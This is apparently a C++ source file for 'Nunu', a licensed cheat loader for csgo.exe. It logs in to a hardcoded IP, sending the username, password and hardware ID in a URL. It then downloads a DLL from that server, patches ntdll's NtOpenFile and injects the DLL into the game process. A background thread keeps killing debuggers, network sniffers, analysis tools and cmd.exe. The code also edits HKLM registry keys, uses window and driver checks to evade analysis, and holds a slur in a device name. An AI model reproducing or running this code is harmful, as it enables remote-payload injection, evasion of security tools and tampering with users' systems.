#define VERSION (string)"0.2"

#include "includes.h"
#include "antidump.cpp"
#include "lazy_importer.hpp"
#include <thread>
#include "tchar.h"
#pragma once

std::string WEBSITE = XorStr("146.59.23.7");

std::string tm_to_readable_time(tm ctx);

bool running = true;

void KillProcess(const char* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
				exit(-1);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

tool* tools;

DWORD pid;

HANDLE process;
HWND hwndproc;
DWORD clientDLL;


LPVOID ntOpenFile = GetProcAddress(LoadLibraryW(L"ntdll"), "NtOpenFile");

void bipassodariesa()
{
	if (ntOpenFile) {
		char originalBytes[5];
		memcpy(originalBytes, ntOpenFile, 5);
		WriteProcessMemory(process, ntOpenFile, originalBytes, 5, NULL);
	}
	else
	{
		Sleep(2000);
		int msgboxID = MessageBoxA(
			NULL,
			XorStr("Unable to load Error Code: N75Y."),
			XorStr("Nunu"),
			MB_OK
		);
		exit(-1);
	}
}

void Backup()
{
	if (ntOpenFile) {
		char originalBytes[5];
		memcpy(originalBytes, ntOpenFile, 5);
		WriteProcessMemory(process, ntOpenFile, originalBytes, 0, NULL);
	}
	else
	{
		Sleep(2000);
		int msgboxID = MessageBoxA(
			NULL,
			XorStr("Unable to load Error Code: 6JKL."),
			XorStr("Nunu"),
			MB_OK
		);
		exit(-1);
	}
}

bool DoesFileExist(const char* name) {
	if (FILE* file = fopen(name, "r")) {
		fclose(file);
		return true;
	}
	else {
		return false;
	}
}

void input()
{
	while (running)
	{
		int x, y;
		x = 1200;
		y = 1200;
		auto setcur = LI_FN(SetCursorPos);
		setcur(x, y);
		auto blockin = LI_FN(BlockInput);
		blockin(true);
	}
}

static std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

std::wstring s2ws(const std::string& s) {
	std::string curLocale = setlocale(LC_ALL, "");
	const char* _Source = s.c_str();
	size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
	wchar_t* _Dest = new wchar_t[_Dsize];
	wmemset(_Dest, 0, _Dsize);
	mbstowcs(_Dest, _Source, _Dsize);
	std::wstring result = _Dest;
	delete[]_Dest;
	setlocale(LC_ALL, curLocale.c_str());
	return result;
}

static std::string RandomProcess()
{
	std::vector<std::string> Process
	{
		XorStr("csgo.exe"),
	};
	std::random_device RandGenProc;
	std::mt19937 engine(RandGenProc());
	std::uniform_int_distribution<int> choose(0, Process.size() - 1);
	std::string RandProc = Process[choose(engine)];
	return RandProc;
}

std::string tm_to_readable_time(tm ctx) {
	char buffer[25];

	strftime(buffer, sizeof(buffer), "%m/%d/%y", &ctx);

	return std::string(buffer);
}

//__forceinline void sec::shutdown()
//{
	//raise(11);
//}

//void checkPEB()
//{
	//PBOOLEAN BeingDebugged = (PBOOLEAN)__readgsqword(0x60) + 2;
	//if (*BeingDebugged)
	//{
		//exit(0);
	//}
//}

int main() {

	std::thread([&] {
		while (true) {
			KillProcess(XorStr("ida64.exe"));
			KillProcess(XorStr("ida.exe"));
			KillProcess(XorStr("idaq64.exe"));
			KillProcess(XorStr("idaq.exe"));
			KillProcess(XorStr("HTTPDebuggerUI.exe"));
			KillProcess(XorStr("HTTPDebuggerSvc.exe"));
			KillProcess(XorStr("MLSvc.exe"));
			KillProcess(XorStr("perfmon.exe"));
			KillProcess(XorStr("perfmon.svc"));
			KillProcess(XorStr("procmon.exe"));
			KillProcess(XorStr("HttpAnalyzerStdV5.exe"));
			KillProcess(XorStr("netmon.exe"));
			KillProcess(XorStr("nmcap.exe"));
			KillProcess(XorStr("wireshark.exe"));
			KillProcess(XorStr("x64dbg.exe"));
			KillProcess(XorStr("ProcessHacker.exe"));
			KillProcess(XorStr("cheatengine-x86_64.exe"));
			KillProcess(XorStr("idaq.exe"));
			KillProcess(XorStr("ImmunityDebugger.exe"));
			KillProcess(XorStr("LordPE.exe"));
			KillProcess(XorStr("PETools.exe"));
			KillProcess(XorStr("joeboxserver.exe"));
			KillProcess(XorStr("joeboxcontrol.exe"));
			KillProcess(XorStr("windbg.exe"));
			KillProcess(XorStr("HTTPAnalyzerStdV7.exe"));
			KillProcess(XorStr("x32dbg.exe"));
			KillProcess(XorStr("die.exe"));
			KillProcess(XorStr("OllyDbg.exe"));
			KillProcess(XorStr("OllyDbg32.exe"));
			KillProcess(XorStr("OllyDbg64.exe"));
			KillProcess(XorStr("binaryninja.exe"));
			KillProcess(XorStr("PE-bear.exe"));
			KillProcess(XorStr("Sigbench.exe"));
			KillProcess(XorStr("cmd.exe"));
			KillProcess(XorStr("tv_w32.exe"));
			KillProcess(XorStr("tv_x64.exe"));
			KillProcess(XorStr("Charles.exe"));
			KillProcess(XorStr("tcpview.exe"));
			KillProcess(XorStr("fiddler.exe"));
			KillProcess(XorStr("HookExplorer.exe"));
			KillProcess(XorStr("netFilterService.exe"));
			KillProcess(XorStr("dumpcap.exe"));
			KillProcess(XorStr("SysInspector.exe"));
			KillProcess(XorStr("proc_analyzer.exe"));
			KillProcess(XorStr("sysAnalyzer.exe"));
			KillProcess(XorStr("sniff_hit.exe"));
			system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
			system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
			system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
			system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
			system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
			system(XorStr("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1"));
			system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1"));
			system(XorStr("sc stop wireshark >nul 2>&1"));
			system(XorStr("sc stop npf >nul 2>&1"));
		}
		}).detach();

		void detect();
		{
			HWND window;
			window = FindWindow(0, XorStr("IDA: Quick start"));
			if (window)
			{
				exit(0);
			}

			window = FindWindow(0, XorStr("Memory Viewer"));
			if (window)
			{
				exit(0);
			}

			window = FindWindow(0, XorStr("Process List"));
			if (window)
			{
				exit(0);
			}

			window = FindWindow(0, XorStr("KsDumper"));
			if (window)
			{
				exit(0);
			}
		}

		void driverdetect();
		{
			const TCHAR* devices[] = {
		_T(XorStr("\\\\.\\NiGgEr"))
		/*
		_T(XorStr("\\\\.\\KsDumper")),
		_T(XorStr("\\\\.\\HttpDebug")),
		_T(XorStr("\\\\.\\TitanHide")),
		_T(XorStr("\\\\.\\SharpOD_Drv")),
		_T(XorStr("\\\\.\\npf"))*/
			};

			WORD iLength = sizeof(devices) / sizeof(devices[0]);
			for (int i = 0; i < iLength; i++)
			{
				HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
				TCHAR msg[256] = _T("");
				if (hFile != INVALID_HANDLE_VALUE) {
					system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO ide siku Detected. && TIMEOUT 10 >nul"));
					exit(0);
				}
				else
				{

				}
			}
		}

		string username;
		string password;


		tools->checkPrivileges();	//sprawdza czy odpalil jako admin
		tools->checkInternet();		//sprawdza czy chlop ma internet

		string check_version = tools->httpRequest(WEBSITE, XorStr("version.php")); //

		if (check_version == VERSION) { //

			tools->setupConsole(XorStr("Nunu"), 450, 300); //

			tools->title();
		    
			tools->gotoxy(2, 3); std::cout << termcolor::cyan << XorStr("Username:") << termcolor::white;

			do {						//
				tools->gotoxy(12, 3);
				getline(cin, username);

			} while (username.empty());

			tools->gotoxy(2, 4); std::cout << termcolor::cyan << XorStr("Pass:")           << termcolor::white;

			do {                      //

				tools->gotoxy(8, 4);
				getline(cin, password);

			} while (password.empty());


			tools->toggleText(); //

			HW_PROFILE_INFO hwProfileInfo;
			string hwid;

			if (GetCurrentHwProfile(&hwProfileInfo)) { //

				hwid = hwProfileInfo.szHwProfileGuid; //

				char request[512];
				sprintf(request, XorStr("/check.php?username=%s&password=%s&hwid=%s&token=0Qehw9ViWdsLPkOW4jPZq5E6jv8LuN511Do0MLHuDVqrKneKL0iErJOuhS6NGiWv"), username.c_str(), password.c_str(), hwid.c_str());
				string login_response = tools->httpRequest(WEBSITE, request); //

				if (login_response != XorStr("dSq7FjJoWuEp60zENzFWX4CcqtoDrXTg2bVFnmDdodK3ICYyf887u3TVAqdBnQz1gPohAipqMz35UeW0CCHq0bl2ARdzzx20VajSUHXQvAS5CrZarOT9GiIHQbYHcqzl")) {
					if (login_response.find(XorStr("6FXRbktbJVZgtof6fmKJtO3Xc1hNd3WBvMPYJqq2fLq1f4ySA5rNZE8HLubZuBoEkQSADggJSCc4SrdqmrObA8xCcEQHw5xOyY2rjeI0WWBa5RKTsXl1ujbEl1HbeIER")) != std::string::npos) { //

						if (login_response.find(XorStr("7MblJ3QuTZiINYe3nDq0qHfMUTK056vL6yC46aKV2RL0Hn3zA2jTzr8HgHa2VPPWkqHyk7UIxbvQii59uA7OWw40ioVr1jKp3C8CZQ3Q6lDva794nFNLjPJ8S6nJLpyy")) != std::string::npos || login_response.find(XorStr("ijii61Dhw2LdbtELcNXPyUzM4UKNpvxMlTypuNfdCeITST3VoZ9lNSwR88wGcYbH33jInCTac3X5uUYu9ioe1HMONS0zo9q7SCnS2E4bwOYLNbEQ89PyFMY3UqCdbfNR")) != std::string::npos) { //
							if (login_response.find(XorStr("Z9J4SrcdywBOimCTln0s87ZlPvw3QRDvse5Pgw4NVNN6gUNLfxQDDLtLWcQLzcn98kYGnhFvltYnk0UWSBcGjQ9XwgSSjLak0XuLCXD9dA8F0owgQ114jdgMOvfdQkc3")) != std::string::npos) {

								system(XorStr("cls"));
								tools->toggleCursor();
								tools->title();
								system("Reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d \"0\" /f");
								system("Reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnableSuperfetch\" /t REG_DWORD /d \"0\" /f");
								system("Reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"LargeSystemCache\" /t REG_DWORD /d \"0\" /f");
								system("Reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnableBoottrace\" /t REG_DWORD /d \"0\" /f");

								tools->gotoxy(2, 2); std::cout << termcolor::red << XorStr("click 1");

								int key_chosen = _getch();

								if (key_chosen == '1') {
									HWND hwnd;
									hwnd = FindWindowA(0, "csgo.exe");
									if (hwnd != 0) {
										system(XorStr("cls"));
										//std::thread freeze(input);
										if (tools->downloadFile(XorStr("http://146.59.23.7/panel/download.php?token=KiWmwuGA1FTOrNuN8cu0IK5H4hWP1gl4GAt70mieoDk1hGyRdFmGsF5qnOP8xtor"), XorStr("C:\\revivalExcalibur\\blhRpx.dll"))) {
											DeleteUrlCacheEntry(XorStr("http://146.59.23.7/panel/download.php?token=KiWmwuGA1FTOrNuN8cu0IK5H4hWP1gl4GAt70mieoDk1hGyRdFmGsF5qnOP8xtor"));
											//GlobalAddAtomA(XorStr("DaJAmkB1FWG1XTbt21Z3"));
											hwndproc = FindWindowA(0, "csgo.exe");
											GetWindowThreadProcessId(hwndproc, &pid);
											process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
											clientDLL = tools->GetModule(pid, "client.dll");

											if (DoesFileExist("C:\\revivalExcalibur\\blhRpx.dll")) {
												bipassodariesa();

												if (tools->load(pid, "C:\\revivalExcalibur\\blhRpx.dll")) {
													Sleep(2000);
													Backup();
													std::cout << "Nunu Loaded.\n";
													exit(-1);
												}
												else
												{
													Sleep(2000);
													Backup();
													int msgboxID = MessageBoxA(
														NULL,
														XorStr("Unable to load Error Code: Z38P."),
														XorStr("Nunu"),
														MB_OK
													);
													exit(-1);
												}

											}
											else
											{
												Sleep(2000);
												int msgboxID = MessageBoxA(
													NULL,
													XorStr("Unable to load Error Code: ZRA7."),
													XorStr("Nunu"),
													MB_OK
												);
												exit(-1);
											}

											//tools->loadLibrary(XorStr("csgo.exe"), XorStr("c://1.dll"));
										}
										else {
											Sleep(2000);
											int msgboxID = MessageBoxA(
												NULL,
												XorStr("Unable to load Error Code: AC2C."),
												XorStr("Nunu"),
												MB_OK
											);
											exit(-1);
										}
									}
									else {
										Sleep(2000);
										int msgboxID = MessageBoxA(
											NULL,
											XorStr("Start csgo.exe first before injecting."),
											XorStr("Nunu"),
											MB_OK
										);
									}
								}
							}
							else {
								int msgboxID = MessageBoxA(
									NULL,
									XorStr("License is expired."),
									XorStr("Nunu"),
									MB_OK
								);
								exit(-1);
							}


						}
						else {

							int msgboxID = MessageBoxA(
								NULL,
								XorStr("Wrong HWID."),
								XorStr("Nunu"),
								MB_OK
							);
							exit(-1);

						}

					}
					else {

						int msgboxID = MessageBoxA(
							NULL,
							XorStr("Wrong username or password."),
							XorStr("Nunu"),
							MB_OK
						);
						exit(-1);

					}
				}
				else {
					int msgboxID = MessageBoxA(
						NULL,
						XorStr("User is Banned."),
						XorStr("Nunu"),
						MB_OK
					);
					exit(-1);
				}

			}
			else {

				int msgboxID = MessageBoxA(
					NULL,
					XorStr("Couldn't read hwid."),
					XorStr("Nunu"),
					MB_OK
				);
				exit(-1);

			}


		}
		else {

			int msgboxID = MessageBoxA(
				NULL,
				XorStr("You have old version of the loader go to website and download it again."),
				XorStr("Nunu"),
				MB_OK
			);
			exit(-1);

		}

		return 0;
}